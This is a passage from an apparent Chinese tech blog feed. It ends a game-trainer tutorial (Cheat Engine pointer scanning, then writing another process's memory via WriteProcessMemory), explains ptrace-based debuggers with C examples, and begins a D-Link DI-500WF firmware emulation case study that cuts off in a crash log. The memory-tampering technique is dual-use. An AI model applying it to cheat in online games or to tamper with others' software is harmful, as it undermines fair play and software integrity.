<p>这些结果仍然是动态地址，实际上这就是多级指针。</p>
<p>面向对象开发中通常会编写各种类，例如本游戏主角有基本的数据，主角手里拿着枪，不同的枪有不同的属性，另外还可以拾取不同的道具等，表示玩家的类中很可能包含着其他对象的实例，用伪代码表示如下</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    HealthController healthPtr;</span><br><span class="line">    GunController gun;</span><br><span class="line">    <span class="comment">// xxx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这就导致玩家对象中又存在着指向其他对象的指针，而其他对象中又会存在指向另外一些数据的指针</p>
<p>源代码经过编译器编译之后就会出现很多 [xxx + xxx] 形式的指针解引用，通常寄存器中保存的是某个对象的起始地址，加上偏移量就得到了确切的数据。</p>
<p>所谓最原始的方法就是一级一级的向上寻找指针，例如我们通过血量得到了某个对象的基址，那么可以确定肯定有另一个对象保存了这个基址指针，所以再次搜索这个基址，找到了一大堆地址，这些地址很可能属于其他对象，还需要重复执行 find what access this address 找到什么指令访问了这个地址，从而找到另外一个对象的基址…(CE 教程中有多级指针的章节，可自行了解)</p>
<p>体积比较小的游戏最多可能会存在 6、7 级指针，体积很大的游戏可能存在十几层指针，这种手动寻找方式效率太低，而且找到的地址很可能没办法稳定使用。</p>
<p><strong>聪明的方法</strong>：</p>
<p>寻找多级指针的原理基本可概括为：</p>
<ol>
<li>找到目标数据所在的对象基址(对象1)</li>
<li>找到对象1所在的对象的基址(对象2)</li>
<li>如此循环直到找到一个静态指针指向的对象地址</li>
</ol>
<p>实际上这一过程就是查找基址和偏移量的过程，由于每次搜索对象的基址都会出现很多地址，那么可以通过记录这些地址和偏移量让程序自动寻找到所有可能的指针路线。</p>
<p>例如上面我们找到了 17 条地址，将他们添加到一个数组中，并记录下对应的偏移量，每次从数组中选出一个地址，找到这个地址所在对象的基址，再次搜索，并将结果添加到数组中，如此循环直到找到一个静态地址。这样就能自动找到所有和目标数据相关的静态指针，而且偏移量也被自动记录下来。</p>
<p>这种查找方式在 CE 中被称为指针表。右键血量地址即可看到 pointer map 选项，我们可以对血量这个地址生成一个指针表，然后选择指针扫描选项，在弹出的窗口中选择使用指针表，并设置结尾偏移量必须是 0x118:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-7.png"
                     
                ></p>
<p>这样 CE 就会自动列出所有符合条件的指针：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-8.png"
                     
                ></p>
<p>结果一共有 60 万多个，想象一下如果手动寻找需要多少精力。</p>
<p>不过自动查找出来的指针也不是全部有效的，我们可以看到第一列 base address 中涉及到了很多不同的模块，这 60 万个指针有很大一部分只是凑巧指向了目标地址，为了缩减指针数量，我们可以重新启动游戏，再次找到生命值所在地址，然后重复上面的操作再次生成一张指针表，结合两张表搜索指针：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-9.png"
                     
                ></p>
<p>这样 CE 会比对两张表的指针结果，从而去除所有不符合规则的指针。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-10.png"
                     
                ></p>
<p>这次搜索到 317 个指针，细心观察一下发现还有很多指针最后的数据在变动，这些指针也是无效的。我们可以选择继续重启游戏，进一步缩减指针数量，或者直接在游戏中受伤，然后在选项卡中选择 pointer scanner -&gt; rescan memory 选项，选择 value to find 填写当前生命值，即可直接进行一次指针搜索。</p>
<p>无论采用哪种方法，最终应该会剩下几个指针，此时我们就可以逐个测试了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-11.png"
                     
                ></p>
<p>例如我找到了一个地址 UnityPlayer.dll + 0x144EBB8，经过测试发现这个地址确实是静态的，并且每次重新启动游戏都不会变动。现在可以在 CE 中选择 Add Address Manually ，添加一个指针</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-12.png"
                     
                ></p>
<p>此时就添加了一个指针到 CE 中，重新启动游戏也不会发生改变。</p>
<p>我们得到了静态指针，现在可以着手实现修改器主体了。</p>
<p>由于 CE 只是一个内存修改工具，虽然能够以 CT 表的形式作为修改器使用，但是多数情况下还是希望有一个可执行文件，打开之后按下对应的热键即可实现修改功能。所以利用 C++ 编写修改器是必须的。</p>
<p>修改器基本功能前面提到过，首先需要能够附加到进程，可以使用 OpenProcess 来实现，它返回一个进程的句柄。</p>
<p>读取游戏指定地址的内存可使用 ReadProcessMemory 实现，写入内存就是 WriteProcessMemory。</p>
<p>这里暂且不讨论内部修改器的实现方式。</p>
<p>剩下的都是编码问题了，我把自己写的修改器 demo 上传到 github，项目中代码都很简单，基本思路如上所诉，感兴趣的朋友可以去看看。<a class="link"   href="https://github.com/rrrrrrri/MyEtGTrainer" >https://github.com/rrrrrrri/MyEtGTrainer<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>GAME</category>
      </categories>
  </entry>
  <entry>
    <title>调试器的原理</title>
    <url>/2020/02/21/dig_debugger/</url>
    <content><![CDATA[<p>学习调试器的基本原理。</p>
<span id="more"></span>

<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p><strong>进程</strong>：进程是操作系统资源分配的基本单位，操作系统使用进程控制块(PCB)来表示一个进程。进程有属于他自己的堆栈空间，有一定的优先级，每个进程有独一无二的 PID。</p>
<p><strong>fork 函数</strong>：Linux 中提供的用于创建新进程的函数。</p>
<p>fork 函数原型： pid_t fork(void)，调用 fork 函数的进程称作父进程，被创建的进程称作子进程。如果函数执行成功，父进程返回子进程的 PID，子进程返回 0。如果执行失败，返回负数。</p>
<p>fork 通过完全复制父进程的资源创建子进程，子进程作为父进程的一个副本存在，父子进程几乎是完全相同的。<strong>两者都从 fork 之后开始运行</strong>。<br>底层原理：fork 通过系统调用创建新的进程，进程被存放在任务队列(双向循环链表)中，链表中的每一项都是进程描述符(PCB，进程控制块)。内核通过 PID 表示每一个进程，默认最大值为 32768 。可在 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max 查看。</p>
<p>fork 呼叫系统调用，CPU 控制流转向内核 fork 代码，内核会做 4 件事情：</p>
<ol>
<li>给子进程分配内存和内核线程</li>
<li>将父进程的部分数据拷贝到子进程</li>
<li>将子进程添加到进程列表</li>
<li>fork 返回，开始调度执行。</li>
</ol>
<p>fork 系列函数都是 clone 系统调用的封装，根据不同函数设置不同的调用参数。</p>
<p>fork 生成的子进程和父进程共享代码段，对于数据段采用写时复制技术。</p>
<p><strong>写时复制</strong>：对每个内存区域添加一个计数器，每当一个指针引用了这块内存，计数器就加一。每当一个指针释放了内存，计数器就减一。</p>
<p>两个进程(或多个进程)共享一份内存页，这个内存页被系统标记为写保护。当一个进程想要修改页面内的数据，会因为权限问题触发异常。操作系统捕获这个异常，将受保护的内存页复制出来一份到新的页面，并修改保护标记为可写。想要修改内存数据的进程就去使用新复制出来的页面。原来的内存页依然是写保护的，当其他进程试图修改的时候，系统检测共享这个页面的进程数量，确定写页面的进程是否拥有这个内存页？如果是，就把这个内存页标记为对属主可写。</p>
<p><strong>僵尸进程</strong>：和现实一样，父进程有义务去监管子进程(父亲对孩子有抚养义务)，当子进程执行完毕或者在执行过程中出现某些错误退出之后，父进程需要调用 waitpid 来清理子进程的内核 PCB 结构。如果父进程没有正确的处理子进程相关信息(父亲跑路了)，那么子进程会变成僵尸进程(孤儿)。其保存在内核的 PCB 没人来清理。</p>
<p>理论上所有刚刚结束的进程都是僵尸进程，但是它们的父进程会及时的清理这些已经结束的进程(它们的父亲很有责任心)，所以正常使用系统的时候很少会看见僵尸进程。某些软件编写存在疏漏，就会出现僵尸进程。</p>
<p>例如父进程调用 fork 启动了一个子进程，子进程完成任务结束，但是父进程既不清理，也不退出，导致子进程变成孤儿。此时系统看不过去了，会将僵尸进程的父进程变更成 init 这个老大哥。因为 init 是所有进程的父进程，会伴随着整个系统的运行，老大哥会在一定时间对僵尸进程进行清理，实际上这就是系统启动完毕之后 init 进程的主要职责。</p>
<h2 id="调试器基本原理"><a href="#调试器基本原理" class="headerlink" title="调试器基本原理"></a>调试器基本原理</h2><p>调试器应该具有的功能：</p>
<ol>
<li>追踪进程运行，能够控制执行流。</li>
<li>访问进程的堆栈内存，并且可以随时修改。</li>
<li>添加断点，能够单步执行进程每条指令</li>
<li>随时改变进程代码，并且能够立即产生影响。</li>
</ol>
<p>调试器还有很多功能，但是具有以上功能的调试器已经可以正常使用了。</p>
<p>现代调试器一般有两种，一是利用 CPU 提供的调试工具，例如 Intel CPU 提供了 INT 3 断点、硬件调试寄存器等。二是针对不同架构实现不同的仿真器，模拟 CPU 、内存等一切外围设施，此时调试器对进程拥有绝对的控制权。</p>
<p>目前几乎所有调试器都采用第一种方式，即使用 CPU 提供的调试工具。</p>
<p>调试器的基本思路：</p>
<ol>
<li>将自身附加到进程</li>
<li>注册为调试器</li>
<li>读取进程代码段，利用反汇编引擎处理成汇编指令，输出到屏幕</li>
<li>根据用户选择的指令插入 INT3 断点</li>
<li>操作系统捕获 INT3，寻找注册的调试器</li>
<li>捕获信号，将被替换的指令还原</li>
<li>单步运行，读取堆栈内存等</li>
</ol>
<p>以上是基本的调试器实现思路，但是在 Linux 中我们有一个更好用的工具：ptrace</p>
<p>ptrace 是 Linux 提供的系统调用，其角色和 Windows 中的一系列和进程有关 API 类似，我们可以利用 ptrace 访问目标进程的寄存器，控制目标进程的指令执行等。</p>
<p>wait 系统调用：Linux man page 描述如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">wait、waitpid、waitid 这几个系统调用被用于等待调用者的子进程状态改变。</span><br><span class="line">状态改变意味着子进程终止、子进程收到信号停止或是子进程收到信号重新运行，</span><br><span class="line">对于终止的子进程，父进程调用 waitpid 允许操作系统对这个子进程进行资源回收，否则子进程将会变成僵尸进程。</span><br></pre></td></tr></table></figure></div>

<p>wait 系统调用 wait(&amp;status) 相当于 waitpid(-1, &amp;status, 0);</p>
<p>waitpid 暂停调用它的进程，直到接收到子进程的状态改变信号。默认情况下，此系统调用只等待终止进程的出现，但可以通过修改 option 参数来修改其行为。</p>
<p>第一个参数是 PID，取值如下</p>
<ol>
<li>PID &lt; -1，waitpid 等待所有进程组 ID 和 PID 绝对值相等的子进程</li>
<li>PID &#x3D;&#x3D; -1，等待所有子进程</li>
<li>PID &#x3D;&#x3D; 0，等待所有进程组 ID 和调用者 pid 相等的子进程</li>
<li>PID &gt; 0，等待 pid 和 PID 相等的子进程</li>
</ol>
<p>waitpid 的 option 有很多，具体可参考 man page。</p>
<p>ptrace 系统调用：Linux man page 描述如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ptrace 系统调用允许一个进程监视其他进程的内存和寄存器布局，它主要被用于实现断点调试或是追踪系统调用。</span><br><span class="line">被追踪的进程首先需要被追踪器附加，在一个多线程的进程中，每个线程都可以被一个追踪器附加，或是不被附加而正常运行。所以被追踪的通常是“线程”而不是“进程”。</span><br><span class="line">一个进程可以通过 fork 创建子进程，在子进程中使用 PTRACE_TRACEME 请求父进程对其进行追踪。</span><br><span class="line">在追踪过程中，被追踪进程每次接收到信号的时候就会暂停(SIGKILL 信号除外)，追踪者可使用 waitpid 等系统调用获取到子进程暂停这一事实，当子进程处于暂停状态的过程中，追踪者可以使用 ptrace 系列工具对子进程进行各种修改，追踪者可选择继续执行子进程，甚至给子进程传递不同的信号。</span><br><span class="line">如果 PTRACE_O_TRACEEXEC 选项没有生效，那么被追踪进程每次调用 execve 的时候，都会收到 SIGTRAP 信号，给追踪者获取它控制权的机会。</span><br><span class="line">追踪者结束追踪之后可通过 PTRACE_DETACH 使子进程继续正常运行。</span><br></pre></td></tr></table></figure></div>



<h2 id="实现最简单的调试器"><a href="#实现最简单的调试器" class="headerlink" title="实现最简单的调试器"></a>实现最简单的调试器</h2><p>那么如何使用系统提供的 ptrace 实现一个最简单的调试器？</p>
<p>根据前面了解到的有关知识，我们可采用 ptrace + waitpid + fork 方式实现父进程对子进程的调试。</p>
<p>基本思路</p>
<ol>
<li>父进程通过 fork 创建子进程</li>
<li>子进程利用 PTRACE_TRACEME 通知操作系统，要求其父进程对自己进行追踪。</li>
<li>子进程利用 exec 执行其他程序，此时由于 ptrace 的存在，子进程会收到 SIGTRAP 信号而暂停。</li>
<li>父进程使用 waitpid 等待，直到子进程暂停，此时父进程可修改子进程的内存或寄存器。</li>
<li>父进程完成修改，通过 ptrace 使子进程单步运行，父进程继续使用 waitpid 等待子进程暂停，不断循环。</li>
</ol>
<p>基于以上思路，我们可以实现一个最简单的统计程序 CPU 指令数量的调试器。</p>
<p>代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">startProcess</span><span class="params">(<span class="type">char</span>* fileName)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Process starting!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;  <span class="comment">// 告知操作系统，要求父进程追踪自己</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ptrace Error!1\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	execl(fileName, fileName, <span class="number">0</span>, <span class="literal">NULL</span>);  <span class="comment">// 调用 exec 的时候子进程收到 SIGTRAP 信号暂停</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyDebugger</span><span class="params">(<span class="type">pid_t</span> childPid)</span>&#123;</span><br><span class="line">	<span class="type">int</span> wait_status;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> icounter = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	wait(&amp;wait_status);  <span class="comment">// 父进程收到子进程的 SIGTRAP 停止信息</span></span><br><span class="line">	<span class="keyword">while</span>(WIFSTOPPED(wait_status))&#123;  <span class="comment">// 判断子进程是否停止</span></span><br><span class="line">		icounter++; <span class="comment">// 指令计数器 +1</span></span><br><span class="line">		<span class="keyword">if</span>(ptrace(PTRACE_SINGLESTEP, childPid, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123; <span class="comment">// 告知子进程运行一条指令之后再次暂停</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ptrace Error!2\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		wait(&amp;wait_status);  <span class="comment">// 继续等待子进程暂停</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target run %d instructions!\n&quot;</span>, icounter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Debugger Test\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">pid_t</span> pid = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(argc != <span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Please set a filename!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fork failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;  <span class="comment">// child process</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Child process running!\n&quot;</span>);</span><br><span class="line">		startProcess(argv[<span class="number">1</span>]);  <span class="comment">// 子进程启动另一个程序</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Current chind PID: %d\n&quot;</span>, pid);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Current parent PID: %d\n&quot;</span>, getpid());</span><br><span class="line">		MyDebugger(pid);   <span class="comment">// 父进程准备追踪</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>执行结果：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Debugger Test</span><br><span class="line">Current chind PID: 7726</span><br><span class="line">Current parent PID: 7725</span><br><span class="line">Child process running!</span><br><span class="line">Process starting!</span><br><span class="line">Hello World!</span><br><span class="line">Target run 11919 instructions!</span><br></pre></td></tr></table></figure></div>

<p>另外还可以简单修改一下代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">startProcess</span><span class="params">(<span class="type">char</span>* fileName)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Process starting!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ptrace Error!1\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	execl(fileName, fileName, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyDebugger</span><span class="params">(<span class="type">pid_t</span> childPid)</span>&#123;</span><br><span class="line">	<span class="type">int</span> wait_status;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> icounter = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	wait(&amp;wait_status);</span><br><span class="line">	<span class="keyword">while</span>(WIFSTOPPED(wait_status))&#123;</span><br><span class="line">		icounter++;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">		ptrace(PTRACE_GETREGS, childPid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ins = ptrace(PTRACE_PEEKTEXT, childPid, regs.rip, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Trace: RIP = 0x%08x, TEXT = 0x%08x\n&quot;</span>, regs.rip, ins);</span><br><span class="line">		<span class="keyword">if</span>(ptrace(PTRACE_SINGLESTEP, childPid, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ptrace Error!2\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		wait(&amp;wait_status);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target run %d instructions!\n&quot;</span>, icounter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Debugger Test\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">pid_t</span> pid = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(argc != <span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Please set a filename!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fork failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;  <span class="comment">// child process</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Child process running!\n&quot;</span>);</span><br><span class="line">		startProcess(argv[<span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Current chind PID: %d\n&quot;</span>, pid);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Current parent PID: %d\n&quot;</span>, getpid());</span><br><span class="line">		MyDebugger(pid);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过 ptrace 的其他工具，我们可以实现读取目标进程寄存器、代码段数据的目的(需要注意被追踪的程序架构)。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Trace: RIP = 0x0040e95c, TEXT = 0x20fd8148</span><br><span class="line">Trace: RIP = 0x0040e963, TEXT = 0xdf89f072</span><br><span class="line">Trace: RIP = 0x0040e965, TEXT = 0x34e8df89</span><br><span class="line">Trace: RIP = 0x0040e967, TEXT = 0x030034e8</span><br><span class="line">Trace: RIP = 0x0043e9a0, TEXT = 0x49d76348</span><br><span class="line">Trace: RIP = 0x0043e9a3, TEXT = 0xd0c1c749</span><br><span class="line">Trace: RIP = 0x0043e9aa, TEXT = 0x00e7b841</span><br><span class="line">Trace: RIP = 0x0043e9b0, TEXT = 0x00003cbe</span><br><span class="line">Trace: RIP = 0x0043e9b5, TEXT = 0x0f6619eb</span><br><span class="line">Trace: RIP = 0x0043e9d0, TEXT = 0x44d78948</span><br><span class="line">Trace: RIP = 0x0043e9d3, TEXT = 0x0fc08944</span><br><span class="line">Trace: RIP = 0x0043e9d6, TEXT = 0x3d48050f</span><br><span class="line">Target run 11919 instructions!</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>固件模拟 Case Study (2)</title>
    <url>/2020/01/10/firmadyne2/</url>
    <content><![CDATA[<p>最近分析 Dlink 的一款设备 DI-500WF，官网产品地址：<a class="link"   href="http://www.dlink.com.cn/business/product?id=2918" >http://www.dlink.com.cn/business/product?id=2918<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>这种设备在酒店、机场等公共场所比较常见，一般称之为路由条。因为类似酒店、车站这种公共地点摆放普通路由器提供 WiFI 服务存在一定问题（体积太大，走线困难等），所以在房屋装修的时候会考虑安装多个弱电箱或在不显眼的位置安装网络接口，此时路由条就派上用场了，这种设备不需要外接电源，可以直接使用 RJ-45 接口供电，并且体积小，易于安装。虽然路由条体积小，但是其内部系统和普通路由器类似，今天我们来简单看一下如何模拟 DI-500WF 这款设备的系统。</p>
<p><em>注：我会一步步展示在模拟过程中遇到的问题，并提出解决问题的几个方法，希望能给大家拓展一下思路。</em></p>
<span id="more"></span>

<h2 id="下载固件"><a href="#下载固件" class="headerlink" title="下载固件"></a>下载固件</h2><p>固件下载地址：<a class="link"   href="http://support.dlink.com.cn/techsupport/DI-500WF-WT" >http://support.dlink.com.cn/techsupport/DI-500WF-WT<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> (目前最新版本为 2019-01-08)</p>
<p>下载固件的同时我们也将使用手册下载下来。</p>
<h2 id="firmadyne-模拟"><a href="#firmadyne-模拟" class="headerlink" title="firmadyne 模拟"></a>firmadyne 模拟</h2><p>常规操作，按照 github 官网给出的提示一步步输入命令，到 inferNetwork 这一步会遇到问题，整个脚本运行过程中并没有报错，但脚本执行完毕并没有输出网卡信息。</p>
<p>这里我没有去深究原因，而是直接执行 run.sh 尝试启动镜像，内核信息输出正常，最后会打印一行</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hit ENTER for console...</span><br></pre></td></tr></table></figure></div>

<p>但接着会输出一大堆 &#x2F;proc&#x2F;nvram: 没有这个文件或目录。</p>
<p>大概 1 分钟左右输出如下信息：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[   13.192000] do_page_fault() #2: sending SIGSEGV to init for invalid read access from</span><br><span class="line">[   13.192000] 00000000 (epc == 2aeeba24, ra == 2ab20490)</span><br><span class="line">[   13.192000] Cpu 0</span><br><span class="line">[   13.192000] $ 0   : 00000000 fffffffe 7f977018 7f977018</span><br><span class="line">[   13.192000] $ 4   : 7f977018 00000000 0000000b 00000000</span><br><span class="line">[   13.192000] $ 8   : 00000000 7f976f5b 00000008 8f820000</span><br><span class="line">[   13.196000] $12   : 8f821eb0 000007a0 00000000 00000008</span><br><span class="line">[   13.196000] $16   : 2aba0000 7f977481 7f977030 2ab701b4</span><br><span class="line">[   13.196000] $20   : 7f977018 7f97747a 2ab72920 2ab72920</span><br><span class="line">[   13.196000] $24   : 00000018 2aeeba10                  </span><br><span class="line">[   13.196000] $28   : 2ac08180 7f976ff0 0041a448 2ab20490</span><br><span class="line">[   13.196000] Hi    : 000001a5</span><br><span class="line">[   13.196000] Lo    : 00001396</span><br><span class="line">[   13.196000] epc   : 2aeeba24 0x2aeeba24</span><br><span class="line">[   13.196000]     Not tainted</span><br><span class="line">[   13.196000] ra    : 2ab20490 0x2ab20490</span><br><span class="line">[   13.196000] Status: 0000a413    USER EXL IE </span><br><span class="line">[   13.196000] Cause : 10800008</span><br><span class="line">[   13.196000] BadVA : 00000000</span><br><span class="line">[   13.196000] PrId  : 00019300 (MIPS 24Kc)</span><br><span class="line">[   13.196000] Modules linked in:</span><br><span class="line">[   13.196000] Process init (pid: 1, threadinfo=8f820000, task=8f81fb68, tls=2aab7880)</span><br><span class="line">[   13.196000] Stack : 00000000 00000000 7f977468 7f97746a</span><br><span class="line">[   13.196000] Call Trace:</span><br><span class="line">[   13.196000] </span><br><span class="line">[   13.196000] </span><br><span class="line">[   13.196000] Code: 00801821  24a50001  24630001 &lt;90a40000&gt; 1480fffc  a0640000  03e00008  00000000  00000000 </span><br><span class="line">[   13.200000] init/1: potentially unexpected fatal signal 11.</span><br><span class="line">[   13.200000] </span><br><span class="line">[   13.200000] Cpu 